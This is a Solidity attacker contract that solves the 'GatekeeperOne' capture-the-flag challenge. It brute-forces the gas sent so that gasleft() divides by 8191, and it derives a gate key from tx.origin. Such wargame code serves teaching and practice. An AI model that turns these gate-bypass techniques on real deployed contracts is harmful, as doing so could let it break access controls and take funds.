// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";
import {console} from "forge-std/Test.sol";

contract GatekeeperOneAttacker {
    error GatekeeperOneAttacker__enterFailed();

    GatekeeperOne public immutable s_gatekeeper;

    // gateTwo requires gasleft() % 8191 == 0
    // We use 8191 as the base unit and brute force the final offset
    uint256 public constant BASE_GAS = 8191;

    // Starting multiplier used to build the gas amount sent to the target
    uint256 public multiplier = 3;

    // Number of offsets to try
    // Scanning the full modulo range gives us all possible remainders
    uint256 public loops = 8191;

    constructor(address _gatekeeper) {
        s_gatekeeper = GatekeeperOne(_gatekeeper);
    }

    function attack() public returns (bool) {
        bytes8 key = computeKey();
        console.log("Computed key", uint64(key));

        bool solved = false;

        for (uint256 i = 0; i < loops; i++) {
            // Send a gas amount equal to a multiple of 8191 plus a variable offset
            // The offset is brute forced until gasleft() inside gateTwo becomes divisible by 8191
            uint256 gasSent = (BASE_GAS * multiplier) + i;

            (bool success, bytes memory returnData) =
                address(s_gatekeeper).call{gas: gasSent}(abi.encodeCall(s_gatekeeper.enter, (key)));

            console.log("Success", success);

            if (success) {
                // enter() returns true when all gates are passed
                bool entered = abi.decode(returnData, (bool));
                console.log("Entered", entered);

                if (entered) {
                    solved = true;
                    break;
                }
            }
        }

        return solved;
    }

    function computeKey() public view returns (bytes8) {
        // gateThree requires a key with this shape:
        // 0x????????0000XXXX
        //
        // - the lower 4 bytes must equal the lower 2 bytes
        // - the full 8 bytes must be different from the lower 4 bytes
        // - the last 2 bytes must match the last 2 bytes of tx.origin

        // Put a non-zero value in the top 4 bytes so that
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        uint64 firstPart = uint64(0x12345678) << 32;

        // Extract the last 2 bytes of tx.origin
        // Example:
        // 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 -> 0xb0b0
        uint64 lastPart = uint64(uint16(uint160(tx.origin)));

        // Combine the two parts to get:
        // 0x123456780000b0b0
        return bytes8(firstPart | lastPart);
    }

    function setMultiplier(uint256 _multiplier) public {
        multiplier = _multiplier;
    }

    function setLoops(uint256 _loops) public {
        loops = _loops;
    }
}
